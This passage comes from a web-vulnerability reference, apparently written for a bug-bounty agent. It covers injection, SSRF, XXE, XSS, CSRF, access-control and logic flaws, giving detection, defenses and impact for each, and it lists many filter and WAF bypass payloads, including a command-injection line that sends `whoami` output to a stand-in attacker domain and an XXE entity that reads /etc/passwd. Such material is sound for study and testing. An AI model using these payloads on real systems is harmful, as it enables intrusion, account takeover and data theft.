families. Enumerate inputs, find the boundary, assume the check is incomplete.

Canonical references: **OWASP Top 10**, **OWASP Web Security Testing Guide (WSTG)**,
**PortSwigger Web Security Academy**, **PayloadsAllTheThings**, and public HackerOne
disclosures.

---

## CRITICAL / HIGH (Web)

### 17. SQL injection (SQLi)

**What it is.** User input is concatenated into a SQL query, so the attacker's input
becomes *query syntax* instead of *data*. `' OR '1'='1` turns a login check into
always-true; `UNION SELECT` pulls arbitrary columns; stacked queries run arbitrary
statements. Impact ranges from auth bypass to full database read/write to RCE (via
`xp_cmdshell`, `LOAD_FILE`/`INTO OUTFILE`, UDFs).

**Types:** in-band (error-based, UNION-based), **blind boolean** (page changes on
true/false), **blind time-based** (`SLEEP`/`WAITFOR DELAY` to infer bit by bit),
**out-of-band** (OAST/DNS exfiltration when no direct channel). Also **second-order**
(input stored safely, then used unsafely in a later query).

**How it's found.** Inject `'`, `"`, `)`, `--`, and watch for errors/behavior change;
test boolean and time payloads; try `UNION`; use OAST for blind. Probe *every*
parameter, header (User-Agent, Referer, X-Forwarded-For), cookie, and JSON field — not
just obvious ones. sqlmap for automation (where the program allows it).

**Defenses.** **Parameterized queries / prepared statements** (the real fix — data can
never become code); ORMs used safely; least-privilege DB accounts; input allowlists;
stored procedures (if they don't themselves concatenate); and **WAFs** (a filter, not
a fix).

**Bypass techniques — defeating input filters and WAFs (the core):**
- **Keyword-filter bypass:**
  - *Case variation:* `SeLeCt`, `UnIoN`.
  - *Inline comments to break up keywords:* `UN/**/ION SEL/**/ECT`, `SE/*x*/LECT`;
    MySQL version comments `/*!50000SELECT*/` execute only in MySQL and slip past naive
    filters.
  - *Nested/stripped keywords:* if the filter strips `union` once,
    `uniunionon` → `union` after removal; `SELSELECTECT`.
  - *Whitespace alternatives:* replace spaces with `/**/`, `%09`(tab), `%0a`(newline),
    `%0c`, `%0d`, `%a0`, or parentheses `UNION(SELECT(...))`.
  - *Token equivalents:* `AND`/`OR` → `&&`/`||`; `=` → `LIKE`/`REGEXP`/`<>` negation;
    `' OR '1'='1` → `' OR 1 -- -` → `'||'1`.
- **Quote/string bypass:** no quotes needed — use hex (`0x61646d696e`), `CHAR(97,...)`,
  `CONCAT`, or numeric context; use `\` to escape the app's escaping in some stacks.
- **Encoding bypass:** URL-encode, double URL-encode (`%2527`), Unicode/overlong,
  HTML-entity, or mixed encodings the WAF normalizes differently from the DB.
- **Buffering/size bypass:** very long junk prefix so the WAF (which inspects first N
  bytes) misses the payload later in the request; or move the payload to a body/JSON
  the WAF doesn't inspect.
- **HTTP parameter pollution:** `id=1&id=UNION...` — app and WAF disagree on which
  `id` wins.
- **Logic without blocked tokens:** boolean/time-based blind using only allowed
  functions; conditional errors.
- **Out-of-band** when all in-band output is filtered.

**Real cases.** SQLi has driven some of the largest breaches in history (e.g. the 2008
Heartland processor breach, numerous retail/telecom dumps). It remains a perennial
OWASP entry.

**Why it matters.** Full database compromise = every user's credentials, PII, payment
data, and secrets; often a pivot to RCE and the rest of the network. For companies:
mass breach, regulatory penalties (GDPR, PCI-DSS fines, breach-notification costs),
and reputational collapse. For end users: identity theft and fraud from leaked data.

---

### 18. Command injection (OS command injection)

**What it is.** User input reaches a shell/OS command, so the attacker appends their
own commands. `ping $ip` with `ip = 8.8.8.8; cat /etc/passwd` runs both. Leads
directly to RCE on the server.

**How it's found.** Any feature that shells out — ping/traceroute tools, file
conversion (ImageMagick/ffmpeg), PDF/thumbnail generation, archive handling, backups,
"run script" admin features. Inject shell metacharacters; use time delays
(`; sleep 10`) and OAST (`; nslookup $(whoami).attacker.oast`) for blind cases.

**Defenses.** Don't call the shell — use language-native APIs/libraries; if you must,
pass arguments as an **array (no shell)** with strict allowlisting; validate against a
strict allowlist (not a blocklist); drop privileges.

**Bypass techniques (against filters):**
- **Separator variety:** `;`, `|`, `||`, `&`, `&&`, newline `%0a`, backticks `` `cmd` ``,
  `$(cmd)`. If one is filtered, try the others.
- **Whitespace without spaces:** `${IFS}` (e.g. `cat${IFS}/etc/passwd`), `%09` tab,
  brace expansion `{cat,/etc/passwd}`, `<` redirection.
- **Keyword obfuscation:** `c'a't`, `c"a"t`, `ca\t`, `/bin/c?t`, `/???/cat`
  (globbing/wildcards), `$@`/`\` insertion, `$(rev<<<'tac')`, base64-decode-and-pipe,
  `IFS`-split variables.
- **Blind confirmation:** DNS/HTTP OAST callbacks when there's no output; time-based
  `sleep`.
- **Argument/flag injection:** even when you can't add a new command, injecting extra
  *flags* into the intended binary (e.g. a dangerous option) can be as damaging.

**Why it matters.** Command injection is near-instant **server takeover** — read/write
any file, pivot internally, deploy malware, exfiltrate everything. For companies it's
a full breach and often a foothold into internal networks; for critical infrastructure,
a direct control-plane compromise.

---

### 19. Authentication bypass

**What it is.** Gaining authenticated access without valid credentials — via logic
flaws, broken token handling, flawed MFA, or SSO/federation mistakes. Distinct from
*authorization* (what you can do once logged in; see Broken Access Control).

**Common forms & how found.** Enumerate the entire auth surface: login, registration,
password reset, "remember me," MFA, OAuth/SAML/OIDC, session issuance.
- **Logic flaws:** response-manipulation (change `"success":false`→`true`),
  force-browsing past a login step, skipping an MFA/step in a multi-step flow by going
  straight to the post-MFA endpoint.
- **Credential attacks** (where allowed): default creds, credential stuffing,
  password-spray; weak lockout.
- **Token flaws:** predictable/guessable session IDs or reset tokens; JWT issues
  (below).
- **Reset-flow flaws:** host-header poisoning to make the reset link point at your
  domain (victim's token leaks to you); reset token tied to an easily guessed value;
  reset doesn't invalidate sessions.

**Defenses.** Proven frameworks (don't roll your own); strong session tokens (CSPRNG,
`HttpOnly`/`Secure`/`SameSite`); server-side MFA enforcement; correct OAuth/OIDC with
`state`/PKCE/nonce; rate limiting + lockout; secure reset (short-lived, single-use,
bound tokens; ignore client-supplied Host).

**Bypass techniques:**
- **JWT attacks:** `alg: none` accepted → forge any claims unsigned; **algorithm
  confusion** (server verifies an RS256 token using the *public* key as an HS256
  *secret*, so you sign with the known public key); weak/guessable HMAC secret (crack
  it, mint admin tokens); `kid` header injection (path traversal/SQLi to control the
  verification key); not checking `exp`; accepting tokens signed by the wrong key
  (`jwk`/`jku` header pointing at attacker-hosted keys).
- **OAuth/SSO:** missing/replayable `state` (CSRF/login-CSRF), `redirect_uri`
  validation bypass (open-redirect to steal the code/token — see §29), SAML signature
  stripping / **XML signature wrapping** (XSW) / comment-truncation
  (`admin@x.com<!---->.evil.com`), `email_verified` not checked so you register the
  victim's email at the IdP.
- **MFA bypass:** backup/remember-device flows that skip MFA; endpoint reachable
  without the MFA step (direct request); response tampering; OTP brute force with weak
  rate limits; race on OTP verification.
- **Session fixation:** set a known session id before login that the app keeps after
  auth.
- **Password-reset poisoning** via `Host`/`X-Forwarded-Host`.

**Why it matters.** Auth bypass is **account takeover at scale** — any user, including
admins. For companies: breach, fraud, and total loss of the access-control premise;
for users: hijacked accounts, stolen identity/funds, impersonation.

---

### 20. SSRF (Server-Side Request Forgery)

**What it is.** The app fetches a URL the attacker controls (webhook, URL preview,
image-from-URL, PDF renderer, import-from-URL, XXE-driven). The attacker makes the
**server** make requests — to internal services, cloud metadata, or arbitrary hosts —
from a trusted position behind the firewall.

**Why it's so dangerous.** Reaches internal admin panels, databases, and especially
**cloud metadata** (`http://169.254.169.254/...`) to steal IAM credentials / instance
role tokens → cloud account takeover. (The 2019 Capital One breach was SSRF → metadata
credentials → S3 exfiltration of ~100M records.)

**How it's found.** Any parameter holding a URL/host/filename; webhooks and callbacks;
"fetch/preview/import" features; PDF/screenshot generators; file parsers that follow
references. Point them at OAST/Burp Collaborator to confirm the server reaches out,
then at `169.254.169.254` and internal ranges.

**Defenses.** **Allowlist** destination hosts/schemes (not blocklist); resolve the
hostname and validate the **resolved IP** against private ranges *after* resolution
(and re-use that IP for the actual connection); disable redirects or re-validate each
hop; block non-HTTP schemes; require metadata service **IMDSv2** (token-bound);
network-layer egress controls.

**Bypass techniques — defeating URL/blocklist filters (the core):**
- **Alternate IP encodings of `169.254.169.254` / `127.0.0.1`:** decimal
  (`2130706433` for 127.0.0.1), octal (`0177.0.0.1`), hex (`0x7f000001`), mixed, and
  **short forms** (`127.1`, `0`, `0.0.0.0`). Blocklists can't enumerate every
  representation.
- **IPv6:** `::1`, `::ffff:127.0.0.1`, `[::ffff:a9fe:a9fe]` — filters that only check
  IPv4 miss these. (A 2026 Craft CMS SSRF patch was bypassed same-day via an IPv6
  metadata endpoint the IPv4-only validator didn't cover.)
- **DNS rebinding:** a hostname you control resolves to a *safe* public IP at
  validation time (low/zero TTL), then to `169.254.169.254`/`127.0.0.1` on the actual
  request — **TOCTOU** between the check and the connect. Defeats "resolve-then-check"
  if the app resolves twice.
- **Redirect-based:** point at an allowlisted/your URL that **302-redirects** to the
  internal target; if the fetcher follows redirects without re-validating, you're in.
- **Open redirect on an allowlisted domain** chained as the redirector.
- **Credentials/fragment/confusion in the URL:** `http://expected.com@169.254.169.254/`,
  `http://169.254.169.254#expected.com`, `http://169.254.169.254%2f@expected.com`,
  backslashes/`%00`, and parser differentials where the validator and the HTTP client
  disagree on the host.
- **Non-HTTP schemes:** `gopher://` (craft raw TCP to hit Redis/Memcached/SMTP — even
  send multi-line protocol commands), `dict://`, `file://` (local file read),
  `ftp://`.
- **Rare TLDs / internal names:** `localhost` variants, internal DNS names,
  `metadata.google.internal`.

**Why it matters.** SSRF is a top pivot bug: internal network access and, via cloud
metadata, **full cloud account compromise** (Capital One: ~$190M in costs/fines,
100M+ customers' data). For companies it's a breach multiplier; for critical/cloud
infra it breaches the trusted perimeter entirely.

---

### 21. Insecure deserialization

**What it is.** The app deserializes attacker-controlled serialized data back into
objects. In many stacks, deserialization can instantiate arbitrary classes and trigger
"magic" methods during/after construction — chained into **RCE** via *gadget chains*.
Even without RCE: object injection, auth bypass (tampering with serialized role
flags), and DoS.

**Where it bites.** Java (`ObjectInputStream`, ysoserial gadget chains),
.NET (`BinaryFormatter`, `TypeNameHandling` in JSON.NET), PHP (`unserialize()` +
`__wakeup`/`__destruct` POP chains), Python (`pickle`), Ruby (Marshal/YAML),
Node (`node-serialize`), and unsafe YAML (`yaml.load` without SafeLoader).

**How it's found.** Spot serialized blobs: base64 starting `rO0` (Java),
`AAEAAAD` (.NET `BinaryFormatter`), PHP `O:8:"..."`, pickle opcodes; cookies, view
state, caches, message queues, hidden fields. Tamper and watch behavior; use
**ysoserial**/**ysoserial.net**/PHPGGC to build gadget chains when dependencies allow.

**Defenses.** **Don't deserialize untrusted data.** Use data-only formats (JSON/
protobuf) with schema validation; if unavoidable, use allowlists of permitted classes
(`ObjectInputFilter`, `SafeLoader`), integrity-protect serialized data (HMAC) so it
can't be tampered, and run with least privilege.

**Bypass techniques:**
- **Find a gadget chain in the actual classpath** — the defense "we don't call
  anything dangerous" fails because a *library* (Commons-Collections, Spring, etc.)
  provides the chain. Match the chain to the deployed dependencies.
- **Class-allowlist gaps:** a chain built entirely from allowlisted classes, or a new
  gadget the allowlist didn't anticipate.
- **`TypeNameHandling`/polymorphic JSON** — JSON "safe" formats become dangerous when
  configured to embed and honor `$type`.
- **Weak/absent integrity:** if the HMAC key is leaked/guessable (common with default
  framework secrets, e.g. known Django/Rails/Flask secret keys), re-sign a malicious
  payload.
- **Property-oriented programming (POP)** chains in PHP via magic methods even without
  a public "deserialize" endpoint (second-order via stored serialized data).

**Why it matters.** Often **pre-auth RCE** — among the most severe web bugs. Full
server compromise, lateral movement, data theft. For companies, a worst-case breach;
for infrastructure, direct takeover.

---

### 22. XXE (XML External Entity injection)

**What it is.** An XML parser configured to resolve **external entities** processes
attacker-defined entities in uploaded/posted XML. `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
reads local files; `SYSTEM "http://169.254.169.254/..."` turns XXE into SSRF;
parameter entities exfiltrate out-of-band; crafted entities cause DoS (billion
laughs).

**Where it bites.** Any XML input: SOAP, SAML, RSS, SVG upload, DOCX/XLSX/ODF (zipped
XML), XML APIs, config import. Also anywhere a format *contains* XML.

**How it's found.** Submit XML with a benign external entity pointing at OAST; if the
server connects, XXE is live. Try file reads; try parameter-entity OOB exfiltration for
blind cases; test file-upload parsers (SVG especially).

**Defenses.** **Disable DTDs / external entities** in the parser (the fix):
`disallow-doctype-decl`, `external-general-entities=false`, `XMLConstants.FEATURE_SECURE_PROCESSING`,
`defusedxml` in Python, `libxml_disable_entity_loader` historically in PHP. Prefer JSON
where possible.

**Bypass techniques:**
- **Blind/OOB via parameter entities** when direct output isn't reflected — exfil file
  contents to your server through a crafted DTD.
- **Alternate injection points:** if the obvious XML is locked down, find a *secondary*
  XML parser (a file-upload format, a nested document, an XInclude:
  `<xi:include parse="text" href="file:///etc/passwd"/>` when XInclude is enabled even
  though DOCTYPE is blocked).
- **Encoding/UTF-16/BOM tricks** to slip past naive request filters.
- **SVG/Office upload** as the XML carrier when the main API rejects raw XML.

**Why it matters.** File disclosure (secrets, source, `/etc/passwd`), SSRF into cloud
metadata, and sometimes RCE — a breach and pivot vector. SAML-based XXE/signature bugs
also break SSO for an entire org.

---

### 23. Broken access control & IDOR

**What it is.** The #1 OWASP category. The app authenticates *who you are* but fails to
enforce *what you may access/do*. **IDOR** (Insecure Direct Object Reference): change
an identifier (`/account?id=123` → `124`, or a filename, UUID, or key in a JSON body)
and read/modify another user's object because the server never checks ownership.
Broadly includes **horizontal** (other users' data), **vertical** (admin functions),
missing function-level checks, and forced browsing to hidden endpoints.

**How it's found.** Make two accounts; do an action as user A; replay it as user B
swapping only the identifier — does it work? Enumerate IDs (sequential, or
"unguessable" UUIDs that leak elsewhere). Hit admin/API endpoints directly without the
UI. Try every HTTP method. Check every object reference in URLs, bodies, headers, and
nested JSON. This is often the *highest-yield* class in bug bounty because it's pure
logic and automation-friendly.

**Defenses.** **Enforce authorization on every request, server-side, per object**
("does the current principal own/may-act-on this exact resource?"); deny-by-default;
centralized access-control layer; don't rely on unguessable IDs as the only control
(that's security-by-obscurity); re-check on state-changing *and* read actions.

**Bypass techniques (against authorization checks):**
- **Parameter/ID swapping & enumeration** — the base case.
- **Method/verb tampering:** a `GET` is blocked but `POST`/`PUT`/`PATCH`/`DELETE`
  (or `HEAD`, or an arbitrary method) isn't checked the same way; try all.
- **HTTP header overrides for "admin-only" gates:** `X-Forwarded-For: 127.0.0.1`,
  `X-Original-URL`/`X-Rewrite-URL` to reach a blocked path, `X-Forwarded-Host`,
  `X-Custom-IP-Authorization`, `Referer` checks — if the app trusts a spoofable
  header for internal/admin access.
- **Path/URL-normalization tricks** to reach restricted endpoints a front-end filter
  blocked: `/admin` blocked but `/Admin`, `/admin/`, `/admin/.`, `/%61dmin`,
  `/./admin`, `/admin%2f`, `/admin;foo`, matrix params, trailing dots, double slashes
  — front-end proxy and back-end app disagree on the canonical path (also enables
  front-end access-control bypass in reverse proxies).
- **Mass assignment / autobinding:** add fields the UI didn't send
  (`"role":"admin"`, `"isAdmin":true`, `"userId":<victim>`) to a JSON body the server
  binds wholesale.
- **"Unpredictable" reference leakage:** UUID/GUID that leaks in another response, a
  listing endpoint, email, referrer, or cache → defeats "unguessable = safe."
- **GraphQL:** query other objects by id, batch/alias to brute force, reach fields the
  REST layer protected but the resolver doesn't; introspection to map hidden types.
- **Blind/second-order:** an ID that isn't checked on write but is later trusted on
  read by an admin.

**Why it matters.** IDOR/broken access control = mass data exposure and account/data
takeover with *no exploit code* — just changed numbers. It's consistently the most
reported impactful bug class. For companies: large-scale PII/financial leakage,
regulatory exposure; for users: their private data and actions controlled by strangers.

---

### 24. Privilege escalation

**What it is.** Moving from low privilege to higher — **horizontal** (another peer's
data/actions) or **vertical** (user→admin). Usually the *outcome* of another bug:
broken function-level authorization, mass assignment of a role field, JWT/role
tampering, admin endpoints with no vertical check, or a logic flaw in role assignment.

**How it's found.** Map the role matrix (what each role may do); as a low-priv user,
attempt every higher-priv action directly (API, forced browse); tamper role claims in
tokens/cookies/JSON; look for self-service role changes, invite/team flows that let
you grant yourself admin, or "impersonate" features with weak checks.

**Defenses & bypass.** Server-side role checks on *every* privileged function;
immutable server-side role storage (never trust client role); deny-by-default. *Bypass:*
mass assignment (`role=admin`), JWT alg/secret attacks (§19), function-level
authorization gaps, header spoofing, and chaining an IDOR on an admin-management
endpoint.

**Why it matters.** Admin access = control of all users and data; often the final step
of a breach chain. Catastrophic for companies and a direct route to full compromise.

---

## MEDIUM / HIGH (Web)

### 25. Cross-Site Scripting (XSS)

**What it is.** Attacker-controlled input is reflected into a page and executed as
**JavaScript in the victim's browser**, in the victim's session/origin. Steal
cookies/tokens, perform actions as the victim, keylog, pivot to full account takeover,
or (chained) reach internal apps.

**Types:**
- **Reflected:** payload in the request is echoed into the immediate response (needs a
  crafted link/form delivered to the victim).
- **Stored/persistent:** payload saved server-side (comment, profile, filename) and
  served to every viewer — worst, because it can be wormable and hits many users.
- **DOM-based:** vulnerability is entirely client-side — a **source** (`location.hash`,
  `document.URL`, `postMessage`, `localStorage`) flows to a dangerous **sink**
  (`innerHTML`, `eval`, `document.write`, `insertAdjacentHTML`, jQuery `$()`,
  `setAttribute` on event handlers) without sanitization.

**How it's found.** Inject a unique marker, find where/how it's reflected (HTML body,
attribute, JS string, URL, CSS), then craft a context-appropriate breakout. Trace DOM
sources→sinks for client-side. Test every input and reflection context separately.

**Defenses.** **Context-aware output encoding** (HTML, attribute, JS, URL, CSS — each
different); safe sink APIs (`textContent`, not `innerHTML`); framework auto-escaping
(React/Angular/Vue — but watch `dangerouslySetInnerHTML`/`v-html`/`bypassSecurityTrust`);
**Content Security Policy (CSP)** as defense-in-depth; **Trusted Types** for DOM XSS;
`HttpOnly` cookies (so XSS can't read the session cookie — though it can still *act*);
sanitizers like DOMPurify.

**Bypass techniques:**
- **Context breakout & filter evasion:**
  - If `<`/`>` filtered, inject into an existing **attribute/event handler** context:
    `" onmouseover=alert(1) x="`, `" autofocus onfocus=alert(1)`.
  - If `script` is stripped, use other tags/events: `<img src=x onerror=alert(1)>`,
    `<svg onload=alert(1)>`, `<body onload>`, `<iframe srcdoc>`, `<details open ontoggle>`.
  - *Case/obfuscation:* `<ScRiPt>`; split tags `<scr<script>ipt>` to survive naive
    single-pass stripping; HTML-entity/decimal/hex encoding of characters the sink
    decodes.
  - *No parentheses/quotes/alphanumerics:* template literals `` alert`1` ``,
    `eval(atob('...'))`, `onerror=alert;throw 1`; JSFuck-style for extreme filters.
  - *JS-string context:* break out with `';alert(1)//` or `</script>` close.
  - *Alternate encodings:* base64 in `data:` URIs, `javascript:` URL in href, Unicode
    escapes in JS (`alert`).
- **WAF bypass:** case/encoding/mixed-encoding (double-URL, HTML-entity, UTF-7 on old
  stacks), inserting comments/newlines, using less-known event handlers the WAF
  signature list misses, splitting the payload across parameters, oversized request to
  outrun inspection.
- **CSP bypass (the key modern skill):**
  - **JSONP endpoints** on an allowlisted domain: `<script src="https://allowed/jsonp?callback=alert">`.
  - **Allowlisted CDN with a known gadget** (AngularJS on the allowlist → CSP bypass
    via Angular sandbox escape; or any hosted library that can be coerced to run code).
  - **`'unsafe-inline'`** present → inline scripts just run.
  - **`'unsafe-eval'`** + a template/expression sink.
  - **Nonce reuse/leakage** or a nonce predictable/reflected so you can reuse it;
    dangling-markup to steal the nonce.
  - **`base-uri` not set** → inject `<base href>` to hijack relative script loads;
    **`object-src`/`default-src` gaps**; overly broad `*` or scheme-only (`https:`)
    sources.
  - **Policy injection** — if any part of the CSP header reflects user input.
  - **DOM clobbering** to overwrite variables the page trusts, bypassing logic even
    under CSP.
- **Mutation XSS (mXSS):** payload is inert until the browser's HTML parser
  *re-serializes* it (e.g. `innerHTML` round-trips), mutating it into executable
  markup — defeats some sanitizers (older DOMPurify bypasses).
- **`SameSite`/HttpOnly reality check:** HttpOnly stops cookie *reading*, not
  *actions*; token in JS-readable storage is still stealable.

**Why it matters.** XSS = session/account takeover in the user's browser, mass
compromise via stored/wormable payloads, credential and data theft, and a pivot into
internal/admin interfaces. For companies: breach, defacement, supply-chain-like spread;
for users: hijacked accounts and stolen data under their own trusted session.

---

### 26. CSRF (Cross-Site Request Forgery)

**What it is.** A state-changing request (change email/password, transfer funds, change
settings) is authenticated *solely by ambient credentials* (cookies) the browser sends
automatically. An attacker's page triggers the request cross-site; the victim's browser
attaches their cookies; the server can't tell it wasn't the user. Result: actions
performed as the victim without their intent.

**How it's found.** Find state-changing requests; check what authorizes them. If it's
only cookies (no unpredictable token, no custom header requirement), test a
cross-origin form/`fetch`. Check whether a token exists, is validated, and is bound to
the session.

**Defenses.** **CSRF tokens** (unpredictable, per-session/per-request, validated
server-side, not leaked); **`SameSite` cookies** (`Lax`/`Strict`); verify
`Origin`/`Referer`; require a **custom header** for JSON APIs (can't be set
cross-origin without CORS); re-authentication for sensitive actions; double-submit
cookie pattern.

**Bypass techniques (against CSRF defenses — the core):**
- **Token validation flaws:**
  - *Token not tied to the session* → use your own valid token in the victim's request
    (if the server only checks "is this a valid token," not "is it *this user's*").
  - *Token validated only when present* → **delete the token parameter entirely** and
    the check is skipped.
  - *Token tied to a non-session cookie* you can set (double-submit with a cookie the
    attacker can plant via another vuln/subdomain) → inject matching token+cookie.
  - *Method-dependent check* → switch `POST`→`GET` if the token is only enforced on
    POST.
  - *Predictable/static/weak token* (global, time-based, user-id-derived) → forge it.
  - *Token leaked* via Referer, URL, or a reflected response → read then reuse.
- **`SameSite` bypass:**
  - **Lax allows top-level GET navigation** → if a state change is reachable via GET,
    a top-level `window.location` still carries the cookie.
  - **`Lax+POST` 2-minute window** (some browsers): a freshly set cookie behaves as
    `None` briefly.
  - **Same-site, different-origin:** a vuln on *any* subdomain (`sub.site.com`) counts
    as same-site → stored XSS/open redirect there issues the request with cookies.
  - **Method/gadget** `<form method=POST>` auto-submit; or client-side redirect from an
    on-site sink.
- **Referer/Origin check bypass:** request has *no* Referer (via `Referrer-Policy:
  no-referrer`, `rel=noreferrer`, or `data:`/`https→http` downgrade) and the server
  **allows missing Referer**; or the allowlist is a naive substring
  (`attacker.com?x=trusted.com`, `trusted.com.attacker.com`).
- **CORS misconfig as an enabler** (reading responses cross-origin; see §28).
- **Clickjacking** as an alternative when CSRF tokens hold but the UI is framable
  (trick the user into clicking the real button).
- **Login CSRF** (force the victim into *your* account to capture their later input).

**Why it matters.** CSRF performs privileged actions as the victim — password/email
change leading to account takeover, fund transfers, config changes. For companies:
fraud and unauthorized state changes; for users: their account altered or drained
without ever clicking "confirm."

---

### 27. Race conditions / TOCTOU

**What it is.** Two requests hit a **check-then-act** window simultaneously, so a
limit enforced "once" is bypassed because both pass the check before either commits.
Classic: redeem a one-time gift card/coupon N times in parallel; withdraw more than
your balance; use a single-use invite/discount repeatedly; apply a vote/like twice;
bypass a "you already did this" guard. (PortSwigger's "limit overrun" and
"multi-step" race labs.)

**How it's found.** Identify any per-user limit, one-time action, or balance check,
then fire many identical requests **in parallel** (single-packet attack / Turbo Intruder
/ HTTP/2 multiplexing to minimize jitter). Watch for the action succeeding more times
than allowed.

**Defenses.** Atomic DB operations (conditional/compare-and-swap updates,
`SELECT ... FOR UPDATE`, unique constraints), proper locking/transactions,
idempotency keys, enforcing limits in a single atomic step rather than read-modify-write.

**Bypass techniques / attacker view.** Use the **single-packet attack** (send ~20-30
requests so they arrive in one TCP packet, eliminating network jitter) to hit the
window reliably even over the internet; find **multi-step** races (state A→B where a
parallel request sneaks between steps); exploit object/session races (two flows
sharing state). Even "locked" systems often lock the wrong granularity or only one of
several equivalent endpoints.

**Why it matters.** Races turn one coupon into thousands, overdraw balances, double-spend
credits, and bypass quantity/limit controls — direct financial loss and inventory/
fairness abuse. In fintech/crypto-adjacent systems it's effectively minting money.

---

### 28. CORS misconfiguration

**What it is.** CORS relaxes the same-origin policy to let specified origins read
cross-origin responses. Misconfigured, it lets a *malicious* origin read authenticated
responses (stealing data/tokens). The lethal combo: `Access-Control-Allow-Origin`
reflecting the request's `Origin` **plus** `Access-Control-Allow-Credentials: true`.

**How it's found/bypassed.** Send requests with evil `Origin` and inspect the ACAO
response: does it reflect arbitrary origins? Does it trust `null` (sandboxed iframe/
`data:` can send `Origin: null`)? Is the allowlist a weak substring
(`trusted.com.evil.com`, `evil-trusted.com`)? Does it allow any subdomain (then a
subdomain XSS/takeover reads everything)? Pre-flight bypass with "simple" requests.

**Defenses/why it matters.** Strict origin allowlist, never reflect, never combine `*`
with credentials, don't trust `null`. Impact: cross-origin theft of user data and
tokens from authenticated APIs — a read-side account-data breach and a common CSRF/
XSS force-multiplier.

---

## MEDIUM / LOW (Web) — breadth to recognize and chain

### 29. Open redirect

User-controlled redirect target (`?next=`, `?url=`, `?returnTo=`) sends users to an
attacker site. Low alone, but a key **chaining** primitive: steals OAuth
codes/tokens (`redirect_uri`), bypasses SSRF/Referer allowlists, boosts phishing
credibility. *Bypasses:* `//evil.com`, `https:evil.com`, `/\evil.com`,
`https://trusted.com@evil.com`, `trusted.com.evil.com`, double-encoding, whitelisted-
domain-as-substring. **Why it matters:** account takeover via token theft when chained;
large-scale phishing under the brand's domain.

### 30. Business logic flaws

Abuse of *intended* functionality in unintended ways — no "injection," just broken
assumptions: negative quantities/prices (`qty=-1` → credit), integer/currency rounding
in your favor, applying a discount/coupon infinitely or stacking, skipping a payment
step (go straight to the confirmation endpoint), replaying a "buy" webhook, abusing
refund/return flows, exceeding limits via a different unit, time-of-use manipulation,
or workflow steps done out of order. **How found:** understand the *business* intent
and the money/state flow, then violate every assumption ("must I really pay first? can
this be negative/zero/huge? can steps run out of order or in parallel?"). **Defense:**
validate invariants server-side at every step; never trust client-computed prices/
totals/roles. **Why it matters:** direct financial loss and fraud, often invisible to
scanners because nothing is "malformed" — it's the app doing exactly what it was
(wrongly) told. Among the highest-value bounty classes because it's uniquely human to
find.

### 31. File upload vulnerabilities

Uploading a dangerous file (web shell, HTML/SVG with script, polyglot) when validation
is weak. *Bypasses:* content-type spoofing, double extensions (`shell.php.jpg`), null
bytes (`shell.php%00.jpg`), case (`.pHp`, `.phtml`, `.php5`), magic-byte spoofing,
path traversal in the filename to write outside the upload dir, SVG→stored XSS,
bypassing client-side-only checks. **Defense:** allowlist extensions + validate real
content, randomize names, store outside webroot / serve from a sandboxed domain, no
execute permission. **Why it matters:** often direct RCE (web shell) or stored XSS —
server or user compromise.

### 32. Path/directory traversal & LFI

`../../etc/passwd` (or encoded `..%2f`, `..%252f`, `....//`, absolute paths, null
bytes) to read/write files outside the intended directory; LFI can reach RCE via log
poisoning, PHP wrappers (`php://filter`, `data://`), or session files. **Defense:**
canonicalize and confirm the resolved path stays within an allowed base; never pass
user input to file APIs directly. **Why it matters:** source/secret/credential
disclosure, config theft, and an RCE pivot.

### 33. Security misconfiguration & information disclosure

Default creds, directory listing, verbose errors/stack traces, exposed `.git`/`.env`/
backups/admin panels, debug endpoints, missing security headers, overly permissive
cloud buckets, leaked API keys in JS/source maps, outdated components with known CVEs.
Low individually, but together they hand attackers the map and often the keys. **How
found:** recon, content discovery, JS/source review, header analysis. **Why it
matters:** every leaked secret or exposed interface is a shortcut past every other
control; breaches frequently start here.

### 34. Request smuggling & cache poisoning (awareness)

**HTTP request smuggling** (front-end/back-end disagree on request boundaries via
`Content-Length`/`Transfer-Encoding` desync — CL.TE/TE.CL/TE.TE/CL.0/H2.CL) can poison
other users' requests, bypass front-end access controls, and hijack sessions. **Web
cache poisoning/deception** uses unkeyed inputs (headers) to serve attacker content to
others, or tricks caches into storing private responses at public URLs. High impact,
high skill; recognize the preconditions (chained proxies, aggressive caching) and
escalate carefully. **Why it matters:** mass, cross-user compromise and access-control
bypass at the infrastructure layer.

---

# PART III — WHY THIS MATTERS (consolidated framework)

The per-class "Why it matters" notes above are tactical. This section is the
**strategic lens** Qarvis uses to reason about *impact* — for triage, for severity
justification, and for explaining to a client/program why a finding deserves attention.
Impact reasoning is not an afterthought; it is half of what makes a report valuable and
a hunter credible.

### III.1 The four stakeholders (ask these for every finding)

For any bug, reason through the blast radius across four groups:

**1. The company / organization (the asset owner).**
- **Direct financial loss:** drained treasuries/funds (DeFi), fraud, theft, downtime,
  incident-response and forensics cost, ransom.
- **Regulatory & compliance exposure:** GDPR (up to 4% of global revenue), CCPA,
  HIPAA, PCI-DSS fines and loss of card-processing ability, SEC/breach-disclosure
  obligations, SOX. A data bug is a *legal* liability, not just a technical one.
- **Reputational damage:** lost customers, lost partnerships, stock drops, "hacked"
  as a permanent search result. Often the costliest and longest-lasting effect.
- **Operational disruption:** downtime, forced shutdowns, emergency migrations, the
  engineering opportunity cost of firefighting.
- **Legal liability:** lawsuits, class actions, contractual breach with enterprise
  customers.

**2. The client / business partners (B2B blast radius).**
- Supply-chain trust: one vendor's bug becomes every customer's breach (the modern
  supply-chain-attack reality). API keys, integrations, and shared data mean a single
  compromise cascades to partners who trusted the asset owner's controls.
- Contractual and SLA consequences; downstream regulatory exposure they inherit.

**3. The end users (the people).**
- **Data:** PII, messages, health, location, documents — once leaked, *permanently*
  leaked; identity theft and targeted fraud follow for years.
- **Money:** stolen funds, fraudulent transactions, drained accounts.
- **Identity & safety:** account takeover, impersonation, stalking/doxxing from leaked
  data, and for at-risk users (activists, journalists, abuse survivors) real physical
  danger.
- **Irreversibility — especially Web3:** a drained wallet or exploited contract is
  *gone*. No bank to call, no chargeback, no reset. This is why the bar for care in
  crypto is higher than anywhere else: you cannot "fix it later."

**4. Governments / critical infrastructure / national security.**
- Breaches of power, water, healthcare, telecom, transport, and financial market
  infrastructure threaten public safety and economic stability, not just data.
- Stolen crypto has repeatedly been attributed to state actors funding weapons and
  sanctions evasion (e.g. the Lazarus Group and the Ronin/bridge thefts) — making DeFi
  and bridge security a genuine national-security concern.
- Government/defense data breaches enable espionage; election and civic-system
  integrity is a democratic-stability issue.

### III.2 Severity reasoning shortcut

